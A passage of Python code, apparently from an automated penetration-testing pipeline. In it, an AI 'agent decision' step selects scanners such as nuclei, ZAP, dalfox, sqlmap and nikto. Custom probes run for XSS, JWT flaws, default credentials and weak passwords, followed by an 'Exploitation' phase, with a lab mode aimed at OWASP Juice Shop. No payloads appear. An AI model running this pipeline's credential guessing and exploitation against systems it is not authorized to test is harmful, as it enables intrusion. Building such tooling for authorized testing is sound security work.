                     f"[P1.2] Server: '{server_tags_info.get('server', '')}' "
                     f"X-Powered-By: '{server_tags_info.get('powered_by', '')}' "
                     f"-> tech: {', '.join(server_tags_info.get('tech', [])) or 'n/a'}")
        else:
            _add_log(db, scan_id, "[P1.2] Server detection: aucun header serveur expose")

        _agent_headers: Dict[str, str] = {
            "server":        server_tags_info.get("server", ""),
            "x-powered-by":  server_tags_info.get("powered_by", ""),
            "_status_code":  str(server_tags_info.get("status_code", 0)),
        }
        try:
            from app.services.agent_decision import agent_decide as _agent_decide
            agent_decision = loop.run_until_complete(
                asyncio.wait_for(
                    _agent_decide(target, nmap_result, _agent_headers),
                    timeout=35,
                )
            )
        except Exception as _agent_exc:
            _add_log(db, scan_id,
                     f"[AgentAI] Error: {_agent_exc!r}  --  all tools will run",
                     level="warning")
            agent_decision = {
                "tools":       ["subfinder", "zap", "nuclei", "dalfox", "ffuf",
                                 "sqlmap", "gitleaks", "katana", "nikto", "wapiti"],
                "skip":        [],
                "reasons":     {},
                "nuclei_tags": [],
                "zap_ajax":    False,
                "priority":    "web",
                "source":      "error-fallback",
            }
        tools_to_run = set(agent_decision.get("tools", []))
        _add_log(db, scan_id,
                 f"[AgentAI] source={agent_decision.get('source', '?')} | "
                 f"priority={agent_decision.get('priority', '?')} | "
                 f"zap_ajax={agent_decision.get('zap_ajax', False)} | "
                 f"skip={agent_decision.get('skip', [])}")
        for _tool, _reason in agent_decision.get("reasons", {}).items():
            _add_log(db, scan_id, f"  [AGENT SKIP] {_tool}: {_reason}")
        if agent_decision.get("nuclei_tags"):
            _add_log(db, scan_id,
                     f"  [AGENT TAGS] nuclei: {', '.join(agent_decision['nuclei_tags'][:12])}")
        if agent_decision.get("probe_pack_ids"):
            _add_log(db, scan_id,
                     f"[ProbePacks] Selected: {', '.join(agent_decision['probe_pack_ids'])} "
                     f"(detected: {agent_decision.get('probe_pack_reasons', '')})")
        else:
            _add_log(db, scan_id,
                     "[ProbePacks] No pack selected by agent -- fallback generic_rest_api will be used")
        ctx.save_step_result("agent_decision", agent_decision)
        _est_time = (
            "4-6min"  if agent_decision.get("target_profile") == "web_spa"
            else "6-8min" if agent_decision.get("target_profile") == "web_generic"
            else "8-12min"
        )
        _add_log(db, scan_id,
                 f"[AGENT DECISION] profile={agent_decision.get('target_profile', 'unknown')} | "
                 f"tools={','.join(sorted(tools_to_run))} | "
                 f"skipped={','.join(agent_decision.get('skip', [])) or 'none'} | "
                 f"nuclei_timeout={agent_decision.get('nuclei_timeout', 300)}s | "
                 f"estimated_scan_time={_est_time}")

        # PHASE 1.5  --  AUTH DETECTION
        _add_log(db, scan_id,
                 "a*a*a* Auth Detection  --  detection + authentification automatique a*a*a*")
        if settings.AUTO_AUTH_ENABLED and not credentials:
            _add_log(db, scan_id,
                     "[Auth] Mode automatique : detection du type + tentative "
                     "d'enregistrement d'un compte aleatoire / credentials par defaut")
        auth_ctx: AuthContext = AuthContext.empty()
        try:
            creds = AuthCredentials.from_dict(credentials) if credentials else None
            # Cap global 75s sur toute la detection+auth (wait_for).
            # timeout=30.0 interne : donne 15s a detect_auth_type et 20s a
            # _auto_authenticate (register + sleep(1) + login)  --  suffisant pour
            # les SPA Node.js (Juice Shop) qui peuvent prendre 3-5s par requete.
            auth_ctx = loop.run_until_complete(
                asyncio.wait_for(
                    detect_and_authenticate(
                        target, creds,
                        timeout=30.0,
                        auto_auth=settings.AUTO_AUTH_ENABLED,
                    ),
                    timeout=75,
                )
            )
            auth_summary = (
                f"Auth: {auth_ctx.auth_type}"
                + (f" | login={auth_ctx.login_url}" if auth_ctx.login_url else "")
                + (f" | {len(auth_ctx.headers)} header(s), {len(auth_ctx.cookies)} cookie(s)"
                   if auth_ctx.has_auth() else " | unauthenticated scan")
                + (f" |  {auth_ctx.error}" if auth_ctx.error else "")
            )
            _add_log(db, scan_id, f"[Auth] {auth_summary}",
                     level="warning" if auth_ctx.error else "info")
            if auth_ctx.notes:
                _add_log(db, scan_id, f"[Auth] {auth_ctx.notes}")
            if auth_ctx.has_auth():
                _add_log(db, scan_id,
                         "[Auth] [OK] Session obtenue  --  injection dans ZAP, Nuclei, FFUF, SQLMap",
                         level="info")
            else:
                _add_log(db, scan_id,
                         "[Auth] Aucune session obtenue  --  scan non authentifie",
                         level="warning")
        except Exception as _auth_exc:
            _add_log(db, scan_id,
                     f"[Auth] Detection error/timeout: {_auth_exc!r}  --  scan continues unauthenticated",
                     level="warning")
            auth_ctx = AuthContext.empty()

        ctx.save_step_result("auth_context", auth_ctx.to_dict())
        _update_scan(db, scan, auth_config=auth_ctx.to_dict(), progress=27)

        # a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*
        # PHASE 2  --  ACTIVE SCAN  (27 -> 55%)
        # Parallel: ZAP || Nuclei (enriched with Nmap Phase 1) || Dalfox
        # a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*
        _update_scan(db, scan, current_phase="active_scan", progress=27)
        _publish(r, scan_id, "running", 27,
                 "[Phase 2/5] Active Scan  --  ZAP || Nuclei (enriched Nmap) || Dalfox (parallel)...")
        _add_log(db, scan_id, "a*a*a* Phase 2/5: Active Scan (ZAP || Nuclei || Dalfox) a*a*a*")

        # server_tags_info already computed in Phase 1.2 (agent decision block)

        # Nuclei context built from Nmap (Phase 1) + Subfinder  --  FFUF/Katana not yet run
        nuclei_ctx  = _build_nuclei_context(
            nmap_result      = nmap_result,
            subfinder_result = subfinder_result,
            ffuf_result      = None,
            katana_result    = None,
        )

        # Enrichissement des tags selon les technos detectees (headers serveur + ports Nmap)
        _tech_extra_tags: set = set()
        _all_tech_str = " ".join(
            server_tags_info.get("tech", [])
            + [t.lower() for t in nuclei_ctx.get("tech_stack", [])]
        ).lower()
        _open_ports = set(nmap_result.get("summary", {}).get("ports", []))

        if "node" in _all_tech_str or "express" in _all_tech_str or 3000 in _open_ports:
            _tech_extra_tags.update(["nodejs", "jwt", "nosql", "express"])
        if "angular" in _all_tech_str:
            _tech_extra_tags.update(["xss", "misconfig"])
        if any(k in _all_tech_str for k in ("api", "rest", "express", "fastapi", "graphql")):
            _tech_extra_tags.update(["api", "rest", "graphql", "swagger"])

        # Merge des tags deduits des headers serveur + categories generiques toujours
        # presentes (csp, headers, misconfig, exposure, cors, xss, sqli).
        nuclei_ctx["tags"] = sorted(
            set(nuclei_ctx.get("tags", []))
            | set(server_tags_info.get("tags", []))
            | set(agent_decision.get("nuclei_tags", []))
            | _tech_extra_tags
        )
        n_templates = len(nuclei_ctx["template_ids"])
        n_tags      = len(nuclei_ctx["tags"])
        tech_stack  = nuclei_ctx.get("tech_stack", [])
        scan_cats   = nuclei_ctx.get("scan_categories", [])

        if tech_stack:
            _add_log(db, scan_id, f"[P2] Nuclei tech stack from Nmap: {', '.join(tech_stack[:8])}")
        _add_log(db, scan_id,
                 f"[P2] Nuclei: {n_templates} targeted CVEs, {n_tags} tags from Nmap context")

        # Fix 3: Nuclei quick scan mode -- reduce scope when no targeted CVEs detected
        # Avoids loading 1400+ generic templates on a SPA/Node.js target with no known CVEs.
        _nuclei_severity = "info,low,medium,high,critical"
        _NUCLEI_QUICK_TAGS = ["cors", "csp", "discovery", "exposure", "headers", "misconfig", "panel", "redirect", "sqli", "swagger", "tech", "token", "unauth", "xss"]
        if not nuclei_ctx["template_ids"] and len(nuclei_ctx["tags"]) > 8:
            nuclei_ctx["tags"] = _NUCLEI_QUICK_TAGS
            _nuclei_severity   = "medium,high,critical"
            logger.info("[Nuclei] Quick scan mode -- no targeted CVEs, reduced to %d tags + severity>=medium",
                        len(_NUCLEI_QUICK_TAGS))
            _add_log(db, scan_id,
                     f"[P2] Nuclei quick scan: no targeted CVEs, scope reduced to "
                     f"{len(_NUCLEI_QUICK_TAGS)} tags (severity>=medium) -- estimee 3-4min")

        _auth_h = auth_ctx.headers or None
        _auth_c = auth_ctx.cookies or None

        # Health check avant Phase 2  --  evite de lancer les scanners si la cible
        # est deja saturee (CPU 100% apres Phase 1).
        _add_log(db, scan_id, "[HEALTH] Verification disponibilite cible avant Phase 2...")
        _target_ok_p2 = loop.run_until_complete(_wait_for_target(target))
        if not _target_ok_p2:
            _add_log(db, scan_id,
                     "[HEALTH] Cible KO  --  Phase 2 continue (resultats partiels possibles)",
                     level="warning")
        else:
            import time as _time
            _add_log(db, scan_id, "[HEALTH] Cible OK  --  cooldown 10s avant scan actif...")
            _time.sleep(10)

        # Fix 1: Phase 2 PARALLELE -- Nuclei || FFUF rapide || Dalfox simultanement.
        # Dalfox utilise des URLs generiques (fallback) car FFUF tourne en meme temps.
        async def _do_phase2():
            _nuclei_templates = nuclei_ctx["template_ids"] or []
            _base = target if target.startswith(("http://", "https://")) else f"http://{target}"
            # Only GET endpoints with query params -- dalfox can't test POST-only endpoints
            _dalfox_fallback_urls = [
                f"{_base.rstrip('/')}/?q=test",
                f"{_base.rstrip('/')}/search?q=test",
                f"{_base.rstrip('/')}/rest/products/search?q=test",
                f"{_base.rstrip('/')}/api/Products?q=test",
                f"{_base.rstrip('/')}/api/search?q=test",
            ]

            async def _p2_nuclei():
                if "nuclei" not in tools_to_run:
                    return {
                        "target": target, "skipped": True, "findings": [], "total": 0,
                        "by_severity": {}, "error": None,
                        "reason": agent_decision["reasons"].get("nuclei", "skipped by agent decision"),
                    }
                _nuclei_default = {
                    "target": target, "error": None, "findings": [], "total": 0,
                    "by_severity": {}, "max_cvss": None, "templates_used": [], "tags_used": [],
                }
                try:
                    _nuclei_to = max(300, agent_decision.get("nuclei_timeout", 300))
                    return await asyncio.wait_for(
                        _call_nuclei(
                            target,
                            templates       = _nuclei_templates or None,
                            tags            = nuclei_ctx["tags"] or None,
                            extra_targets   = None,
                            tech_stack      = tech_stack or None,
                            scan_categories = scan_cats or None,
                            auth_headers    = _auth_h,
                            auth_cookies    = _auth_c,
                            severity        = _nuclei_severity,
                        ),
                        timeout=_nuclei_to,
                    )
                except asyncio.TimeoutError:
                    _add_log(db, scan_id,
                             f"[P2] Nuclei: TIMEOUT after {_nuclei_to}s -- results may be partial",
                             level="warning")
                    return {**_nuclei_default, "error": f"Nuclei timeout after {_nuclei_to}s"}

            async def _p2_ffuf():
                if "ffuf" not in tools_to_run:
                    return {
                        "target": target, "skipped": True, "endpoints": [], "total": 0,
                        "by_status": {}, "by_category": {}, "by_severity": {}, "error": None,
                        "reason": agent_decision["reasons"].get("ffuf", "skipped by agent decision"),
                    }
                # Delai initial : laisse Nuclei charger ses templates (20s) avant de
                # demarrer FFUF -- reduit la contention HTTP sur la cible au demarrage.
                await asyncio.sleep(20)
                _ffuf_t = agent_decision.get("ffuf_timeout") or 90
                _add_log(db, scan_id, f"[P2] FFUF rapide: timeout={_ffuf_t}s", level="info")
                return await _call_ffuf(
                    target, timeout=_ffuf_t, wordlist="fallback",
                    auth_headers=_auth_h, auth_cookies=_auth_c,
                )

            async def _p2_dalfox():
                # Dalfox runs on ALL HTTP/HTTPS targets without exception.
                # Agent profile-based skips are ignored for web targets.
                if not target.startswith(("http://", "https://")):
                    return {
                        "target": target, "skipped": True, "findings": [], "total": 0,
                        "by_severity": {}, "error": None,
                        "reason": "Non-HTTP/HTTPS target -- dalfox not applicable",
                    }
                # Stagger start to avoid initial connection burst with Nuclei/FFUF
                await asyncio.sleep(20)
                logger.info("[Dalfox] Phase 2 parallel -- using %d generic fallback URLs",
                            len(_dalfox_fallback_urls))
                _dalfox_t = agent_decision.get("dalfox_timeout") or 120
                return await _call_dalfox(
                    target, timeout=_dalfox_t, urls=_dalfox_fallback_urls, auth_headers=_auth_h or None,
                )

            async def _p2_stored_xss():
                stored = await _probe_stored_xss(target, auth_headers=_auth_h or None)
                return {"findings": stored, "total": len(stored)}

            async def _p2_jwt():
                jwt_findings = await _probe_jwt_vulnerabilities(target, auth_headers=_auth_h or None)
                return {"findings": jwt_findings, "total": len(jwt_findings)}

            async def _p2_ftp_null():
                ftp_findings = await _probe_ftp_null_byte(target)
                return {"findings": ftp_findings, "total": len(ftp_findings)}

            async def _p2_user_enum():
                f = await _probe_user_enumeration(target)
                return {"findings": f, "total": len(f)}

            async def _p2_weak_pwd():
                f = await _probe_weak_password(target)
                return {"findings": f, "total": len(f)}

            async def _p2_sec_headers():
                f = await _probe_security_headers(target)
                return {"findings": f, "total": len(f)}

            async def _p2_anti_auto():
                f = await _probe_anti_automation(target, auth_headers=_auth_h or None)
                return {"findings": f, "total": len(f)}

            _login_url = getattr(auth_ctx, "login_url", None) or ""

            async def _p2_default_creds():
                if not _login_url:
                    return {"findings": [], "total": 0}
                f = await _probe_default_credentials(target, _login_url)
                return {"findings": f, "total": len(f)}

            async def _p2_login_rate_limit():
                if not _login_url:
                    return {"findings": [], "total": 0}
                f = await _probe_login_rate_limit(target, _login_url)
                return {"findings": f, "total": len(f)}

            async def _p2_ep():
                _add_log(db, scan_id,
                         "[P2] Extended probes light: running 7 probes (no endpoints needed)")
                try:
                    f = await asyncio.wait_for(
                        _p2_extended_probes_light(
                            target,
                            login_url=_login_url,
                            auth_headers=_auth_h or None,
                        ),
                        timeout=90,
                    )
                except asyncio.TimeoutError:
                    logger.warning("[ExtProbe] light timeout after 90s")
                    f = []
                return {"findings": f, "total": len(f)}

            _r2 = await asyncio.gather(
                _p2_nuclei(), _p2_ffuf(), _p2_dalfox(),
                _p2_stored_xss(), _p2_jwt(), _p2_ftp_null(),
                _p2_user_enum(), _p2_weak_pwd(), _p2_sec_headers(), _p2_anti_auto(),
                _p2_default_creds(), _p2_login_rate_limit(),
                _p2_ep(),
                return_exceptions=True,
            )

            _def_nuclei = {"target": target, "skipped": True, "findings": [], "total": 0,
                           "by_severity": {}, "error": None}
            _def_ffuf   = {"target": target, "skipped": True, "endpoints": [], "total": 0,
                           "by_status": {}, "by_category": {}, "by_severity": {}, "error": None}
            _def_dalfox = {"target": target, "skipped": True, "findings": [], "total": 0,
                           "by_severity": {}, "error": None}
            _def_probe  = {"findings": [], "total": 0}

            _nuclei_r      = _r2[0]  if not isinstance(_r2[0],  Exception) else {**_def_nuclei, "error": str(_r2[0])}
            _ffuf_q        = _r2[1]  if not isinstance(_r2[1],  Exception) else {**_def_ffuf,   "error": str(_r2[1])}
            _dalfox_r      = _r2[2]  if not isinstance(_r2[2],  Exception) else {**_def_dalfox, "error": str(_r2[2])}
            _stored_xss    = _r2[3]  if not isinstance(_r2[3],  Exception) else _def_probe.copy()
            _jwt_probe     = _r2[4]  if not isinstance(_r2[4],  Exception) else _def_probe.copy()
            _ftp_null      = _r2[5]  if not isinstance(_r2[5],  Exception) else _def_probe.copy()
            _uenum_probe   = _r2[6]  if not isinstance(_r2[6],  Exception) else _def_probe.copy()
            _wpwd_probe    = _r2[7]  if not isinstance(_r2[7],  Exception) else _def_probe.copy()
            _hdrs_probe    = _r2[8]  if not isinstance(_r2[8],  Exception) else _def_probe.copy()
            _aauto_probe   = _r2[9]  if not isinstance(_r2[9],  Exception) else _def_probe.copy()
            _defcreds_probe = _r2[10] if not isinstance(_r2[10], Exception) else _def_probe.copy()
            _rlimit_probe   = _r2[11] if not isinstance(_r2[11], Exception) else _def_probe.copy()
            _ep_probe       = _r2[12] if not isinstance(_r2[12], Exception) else _def_probe.copy()

            # Merge all custom probe findings into dalfox result (feeds correlator)
            # ReflectedXSS, XXE, SSRF moved to Phase 3 deep probes
            _all_probes = (
                _stored_xss, _jwt_probe, _ftp_null,
                _uenum_probe, _wpwd_probe, _hdrs_probe, _aauto_probe,
                _defcreds_probe, _rlimit_probe, _ep_probe,
            )
            for _extra in _all_probes:
                if _extra.get("findings"):
                    _dalfox_r.setdefault("findings", []).extend(_extra["findings"])
                    _dalfox_r["total"] = len(_dalfox_r.get("findings", []))
            _probe_counts = {
                "StoredXSS":   _stored_xss["total"],    "JWT":       _jwt_probe["total"],
                "FTPNull":     _ftp_null["total"],
                "UserEnum":    _uenum_probe["total"],    "WeakPwd":   _wpwd_probe["total"],
                "Headers":     _hdrs_probe["total"],     "AntiAuto":  _aauto_probe["total"],
                "DefaultCreds": _defcreds_probe["total"],"LoginRateLimit": _rlimit_probe["total"],
                "ExtProbe":    _ep_probe["total"],
            }
            # Log extended probe summary
            if _ep_probe["total"] > 0:
                _ep_findings = _ep_probe.get("findings", [])
                _ep_counts = {}
                for _ef in _ep_findings:
                    _src = _ef.get("cwe", "unknown")
                    _ep_counts[_src] = _ep_counts.get(_src, 0) + 1
                logger.info(
                    "[P2] Extended probes: %d findings -- captcha=%d enum=%d weak_pwd=%d data_exp=%d 2fa=%d",
                    _ep_probe["total"],
                    sum(1 for f in _ep_findings if "CWE-804" in f.get("cwe", "")),
                    sum(1 for f in _ep_findings if "CWE-204" in f.get("cwe", "")),
                    sum(1 for f in _ep_findings if "CWE-521" in f.get("cwe", "")),
                    sum(1 for f in _ep_findings if "CWE-200" in f.get("cwe", "")),
                    sum(1 for f in _ep_findings if "CWE-287" in f.get("cwe", "")),
                )
            _total_probe_findings = sum(_probe_counts.values())
            if _total_probe_findings > 0:
                logger.info("[Probes] %s — %d total probe findings merged",
                            " ".join(f"{k}={v}" for k, v in _probe_counts.items() if v > 0),
                            _total_probe_findings)

            return _ffuf_q, _dalfox_r, _nuclei_r

        try:
            ffuf_quick, dalfox_result, nuclei_result = loop.run_until_complete(
                asyncio.wait_for(_do_phase2(), timeout=_PHASE2_MAX_SECONDS)
            )
        except asyncio.TimeoutError:
            logger.error("[P2] TIMEOUT GLOBAL %ds  --  phase interrompue, resultats partiels conserves", _PHASE2_MAX_SECONDS)
            _add_log(db, scan_id,
                     f"[P2] TIMEOUT GLOBAL {_PHASE2_MAX_SECONDS}s  --  active scan interrompu, scan continue",
                     level="error")
            _p2_skip = {"skipped": True, "error": "phase2_timeout", "findings": [], "total": 0,
                        "by_severity": {}, "target": target}
            ffuf_quick   = {**_p2_skip, "endpoints": [], "by_status": {}, "by_category": {}}
            dalfox_result = _p2_skip.copy()
            nuclei_result = _p2_skip.copy()

        # Log FFUF rapide (Phase 2)
        if ffuf_quick.get("error"):
            _add_log(db, scan_id, f"[P2] FFUF rapide error: {ffuf_quick['error']}", level="error")
        else:
            _add_log(db, scan_id,
                     f"[P2] FFUF rapide: {ffuf_quick.get('total', 0)} endpoints  --  "
                     f"{len([e for e in ffuf_quick.get('endpoints', []) if '?' in e.get('url', '')])} avec parametres")

        # Log Dalfox (Phase 2)
        if dalfox_result.get("error"):
            _add_log(db, scan_id, f"[P2] Dalfox error: {dalfox_result['error']}", level="error")
        else:
            xss_total = dalfox_result.get("total", 0)
            xss_sev   = dalfox_result.get("by_severity", {})
            if xss_total > 0:
                _add_log(db, scan_id,
                         f"[P2] Dalfox XSS: {xss_total} findings  --  "
                         f"high={xss_sev.get('high', 0)} medium={xss_sev.get('medium', 0)}",
                         level="error" if xss_sev.get("high", 0) > 0 else "warning")
            else:
                _add_log(db, scan_id, "[P2] Dalfox: aucun XSS detecte")
        ctx.save_step_result("dalfox", dalfox_result)

        # Log Nuclei
        if nuclei_result.get("error"):
            _add_log(db, scan_id, f"[P2] Nuclei error: {nuclei_result['error']}", level="error")
            logger.error("Nuclei failed for %s: %s", target, nuclei_result["error"])
        else:
            total_n  = nuclei_result.get("total", 0)
            by_sev   = nuclei_result.get("by_severity", {})
            max_cvss = nuclei_result.get("max_cvss")
            _add_log(db, scan_id,
                     f"[P2] Nuclei: {total_n} findings  --  "
                     f"critical={by_sev.get('critical', 0)} "
                     f"high={by_sev.get('high', 0)} "
                     f"medium={by_sev.get('medium', 0)}"
                     + (f" | max CVSS: {max_cvss}" if max_cvss else ""),
                     level=("error"   if by_sev.get("critical", 0) > 0 else
                            "warning" if by_sev.get("high",     0) > 0 else "info"))
            for f in nuclei_result.get("findings", []):
                sev = f.get("severity", "")
                if sev in ("critical", "high"):
                    cves = ", ".join(f.get("cve_ids", [])) or "n/a"
                    cvss = f.get("cvss_score")
                    _add_log(db, scan_id,
                             f"  [{sev.upper()}] {f.get('name')}  --  CVE: {cves}"
                             + (f" | CVSS: {cvss}" if cvss else "")
                             + f" @ {f.get('matched_at')}",
                             level="error" if sev == "critical" else "warning")
        ctx.save_step_result("nuclei", nuclei_result)
        _update_scan(db, scan, nuclei_data=nuclei_result, progress=45)

        _update_scan(db, scan, progress=55)
        _publish(r, scan_id, "running", 55, "Phase 2/5  --  Active Scan complete [OK]")
        _add_log(db, scan_id, "Phase 2/5 complete [OK]")

        # a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*
        # PHASE 3  --  EXPLOITATION  (55 -> 75%)
        # Step 3a (parallel): FFUF || GitLeaks || Katana (30s max, non-bloquant)
        # Step 3b (conditional): SQLMap  --  only if ZAP/FFUF/Katana detected injectable params
        # a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*
        _update_scan(db, scan, current_phase="exploitation", progress=57)
        _publish(r, scan_id, "running", 57,
                 "[Phase 3/5] Exploitation  --  FFUF || GitLeaks || Katana + SQLMap (conditionnel)...")
        _add_log(db, scan_id,
                 "a*a*a* Phase 3/5: Exploitation (FFUF || GitLeaks || Katana + SQLMap conditionnel) a*a*a*")

        # Katana wrapper: timeout dur de 90s, ne bloque jamais SQLMap.
        # En cas de timeout/erreur -> stub vide, la Phase 3 continue.
        async def _safe_katana() -> Dict[str, Any]:
            stub: Dict[str, Any] = {
                "target": target, "skipped": False, "timed_out": False,
                "api_endpoints": [], "endpoints": [], "js_files": [], "params": [], "urls_with_params": [],
                "total": 0, "error": None,
            }
            try:
                return await asyncio.wait_for(_call_katana(target, timeout=90), timeout=105)
            except asyncio.TimeoutError:
                stub["timed_out"] = True
                stub["skipped"]   = True
                stub["error"]     = "Katana timed out (105s)  --  Phase 3 continues without Katana"
                return stub
            except Exception as exc:
                stub["skipped"] = True
                stub["error"]   = str(exc)
                return stub

        # Phase 3a: tous les outils sont INDEPENDANTS entre eux — gather PARALLELE.
        # Budget max = max(ZAP, FFUF, Katana, Nikto, Wapiti) ≈ 240s << 600s budget phase.
        # Sequential was 780s+, guaranteed phase timeout before Nikto/Wapiti could finish.
        async def _do_phase3a():
            await _wait_for_target(target)

            _zap_skip    = {"target": target, "skipped": True, "alerts": [], "total": 0, "by_risk": {},
                            "endpoints": [], "form_params": [], "abnormal_headers": [], "implicit_ports": [],
                            "error": None, "reason": agent_decision["reasons"].get("zap", "skipped")}
            _ffuf_skip   = {"target": target, "skipped": True, "endpoints": [], "total": 0,
                            "by_status": {}, "by_category": {}, "by_severity": {}, "error": None,
                            "reason": agent_decision["reasons"].get("ffuf", "skipped")}
            _gl_skip     = {"target": target, "skipped": True, "findings": [], "total": 0,
                            "by_severity": {}, "error": None,
                            "reason": agent_decision["reasons"].get("gitleaks", "skipped")}
            _kat_skip    = {"target": target, "skipped": True, "api_endpoints": [], "endpoints": [],
                            "js_files": [], "params": [], "urls_with_params": [], "total": 0,
                            "error": None, "reason": agent_decision["reasons"].get("katana", "skipped")}
            _lab_skip    = {"target": target, "detected": False, "skipped": True,
                            "reason": "lab_mode_disabled", "challenges": [], "total": 0, "error": None}
            _nikto_skip  = {"target": target, "skipped": True, "findings": [], "total": 0,
                            "by_severity": {}, "error": None,
                            "reason": agent_decision["reasons"].get("nikto", "skipped")}
            _wapiti_skip = {"target": target, "skipped": True, "findings": [], "total": 0,
                            "by_severity": {}, "error": None,
                            "reason": agent_decision["reasons"].get("wapiti", "skipped")}

            # Lab challenge API called BEFORE heavy gather so Juice Shop isn't overloaded
            if lab_mode:
                logger.info("[P3] Lab Challenge API: ACTIVE (lab_mode=true) -- pre-gather")
                try:
                    _lab = await asyncio.wait_for(_call_lab_challenges(target, timeout=30), timeout=45.0)
                except (asyncio.TimeoutError, Exception) as _lab_exc:
                    _lab = {**_lab_skip, "detected": False, "error": str(_lab_exc)}
                    logger.warning("[P3] Lab Challenge API failed: %s", _lab_exc)
            else:
                logger.info("[P3] Lab Challenge API: DESACTIVE (lab_mode=false)")
                _lab = _lab_skip

            async def _p3_gitleaks():
                if "gitleaks" not in tools_to_run:
                    return _gl_skip
                return await _call_gitleaks(target, timeout=120)

            async def _p3_zap():
                if "zap" not in tools_to_run:
                    return _zap_skip
                return await _call_zap(
                    target, auth_headers=_auth_h, auth_cookies=_auth_c,
                    ajax_spider=agent_decision.get("zap_ajax", False),
                )

            async def _p3_ffuf():
                if "ffuf" not in tools_to_run:
                    return _ffuf_skip
                return await _call_ffuf(
                    target, timeout=90, wordlist="fallback",
                    auth_headers=_auth_h, auth_cookies=_auth_c,
                )

            async def _p3_katana():
                if "katana" not in tools_to_run:
                    return _kat_skip
                return await _safe_katana()

            async def _p3_nikto():
                if "nikto" not in tools_to_run:
                    return _nikto_skip
                return await _call_nikto(target, timeout=150, auth_headers=_auth_h, auth_cookies=_auth_c)

            async def _p3_wapiti():
                if "wapiti" not in tools_to_run:
                    return _wapiti_skip
                return await _call_wapiti(target, timeout=240, auth_headers=_auth_h, auth_cookies=_auth_c)

            _r3 = await asyncio.gather(
                _p3_gitleaks(),
                _p3_zap(), _p3_ffuf(), _p3_katana(), _p3_nikto(), _p3_wapiti(),
                return_exceptions=True,
            )
            _gl     = _r3[0] if not isinstance(_r3[0], Exception) else {**_gl_skip,     "error": str(_r3[0])}
            _zap    = _r3[1] if not isinstance(_r3[1], Exception) else {**_zap_skip,    "error": str(_r3[1])}
            _ffuf   = _r3[2] if not isinstance(_r3[2], Exception) else {**_ffuf_skip,   "error": str(_r3[2])}
            _kat    = _r3[3] if not isinstance(_r3[3], Exception) else {**_kat_skip,    "error": str(_r3[3])}
            _nikto  = _r3[4] if not isinstance(_r3[4], Exception) else {**_nikto_skip,  "error": str(_r3[4])}
            _wapiti = _r3[5] if not isinstance(_r3[5], Exception) else {**_wapiti_skip, "error": str(_r3[5])}

            return _ffuf, _zap, _gl, _kat, _lab, _nikto, _wapiti

        try:
            ffuf_result, zap_result, gitleaks_result, katana_result, lab_challenges_result, nikto_result, wapiti_result = loop.run_until_complete(
                asyncio.wait_for(_do_phase3a(), timeout=_PHASE3_MAX_SECONDS)
            )
        except asyncio.TimeoutError:
            logger.error("[P3] TIMEOUT GLOBAL %ds  --  phase interrompue, resultats partiels conserves", _PHASE3_MAX_SECONDS)
            _add_log(db, scan_id,
                     f"[P3] TIMEOUT GLOBAL {_PHASE3_MAX_SECONDS}s  --  exploitation interrompue, scan continue avec resultats partiels",
                     level="error")
            _p3_skip = {"skipped": True, "error": "phase3_timeout", "findings": [], "total": 0,
                        "by_severity": {}, "target": target}
            ffuf_result           = {**_p3_skip, "endpoints": [], "by_status": {}, "by_category": {}}
            zap_result            = {**_p3_skip, "alerts": [], "by_risk": {}, "endpoints": [],
                                     "form_params": [], "abnormal_headers": [], "implicit_ports": []}
            gitleaks_result       = _p3_skip.copy()
            katana_result         = {**_p3_skip, "api_endpoints": [], "endpoints": [], "js_files": [], "params": [], "urls_with_params": []}
            lab_challenges_result = {"detected": False, "challenges": [], "total": 0, "error": "phase3_timeout"}
            nikto_result          = _p3_skip.copy()
            wapiti_result         = _p3_skip.copy()

        # Log ZAP (Phase 3)
        if zap_result.get("error"):
            _add_log(db, scan_id, f"[P3] ZAP error: {zap_result['error']}", level="error")
        else:
            total_z        = zap_result.get("total", 0)
            by_risk        = zap_result.get("by_risk", {})
            endpoints_cnt  = len(zap_result.get("endpoints", []))
            implicit_ports = zap_result.get("implicit_ports", [])
            _add_log(db, scan_id,
                     f"[P3] ZAP: {total_z} alerts  --  high={by_risk.get('High', 0)} "
                     f"medium={by_risk.get('Medium', 0)} | "
                     f"{endpoints_cnt} endpoints, {len(implicit_ports)} implicit ports",
                     level=("error"   if by_risk.get("High",   0) > 0 else
                            "warning" if by_risk.get("Medium", 0) > 0 else "info"))
            for a in zap_result.get("alerts", []):
                if a.get("risk_code", 0) >= 3:
                    _add_log(db, scan_id,
                             f"  [HIGH] {a.get('name')}  --  CWE-{a.get('cwe_id', '?')} "
                             f"({a.get('count', 0)} instance(s))", level="error")
            for h in zap_result.get("abnormal_headers", []):
                _add_log(db, scan_id,
                         f"  [HEADER] {h.get('header_issue')}  --  risk: {h.get('risk')}",
                         level="warning")
        ctx.save_step_result("zap", zap_result)
        _update_scan(db, scan, zap_data=zap_result, progress=62)

        # Log Katana
        if katana_result.get("timed_out"):
            _add_log(db, scan_id,
                     "[P3] Katana: TIMEOUT 105s  --  Phase 3 continue sans Katana", level="warning")
        elif katana_result.get("error"):
            _add_log(db, scan_id, f"[P3] Katana error: {katana_result['error']}", level="warning")
        else:
            _add_log(db, scan_id,
                     f"[P3] Katana: {katana_result.get('total', 0)} endpoints crawles"
                     + (f" | {len(katana_result.get('api_endpoints', []))} API endpoints"
                        if katana_result.get('api_endpoints') else ""))
        ctx.save_step_result("katana", katana_result)

        # Log lab challenge discovery (OWASP Juice Shop / vulnerable training apps)
        if lab_challenges_result.get("detected"):
            _add_log(db, scan_id,
